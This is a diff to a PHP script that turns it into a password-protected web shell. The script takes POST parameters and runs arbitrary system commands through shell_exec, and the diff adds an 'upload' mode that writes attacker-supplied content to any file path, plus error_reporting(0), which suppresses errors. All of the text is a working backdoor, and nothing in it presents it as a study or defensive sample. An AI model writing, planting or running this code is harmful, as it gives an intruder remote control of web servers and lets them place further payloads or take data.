@@ -1,11 +1,19 @@
+error_reporting(0);
 $command = $_POST['cmd'];
+$type = $_POST['type'];
 $password_input = $_POST['password'];
 $password = 'password_change';
+$file = $_POST['file'];
+$body_file = $_POST['file_body'];
 if($password_input == $password){
-    if($command == "test"){
+    if($type == "test"){
         echo "suc_1";        
-    }else{
+    }elseif($type == "shell"){
         echo shell_exec($command);
+    }elseif($type == "upload"){
+        $fp = fopen($file, 'w');
+        fwrite($fp, $body_file);
+        fclose($fp);
     }
 }else{
     echo 'error_1';
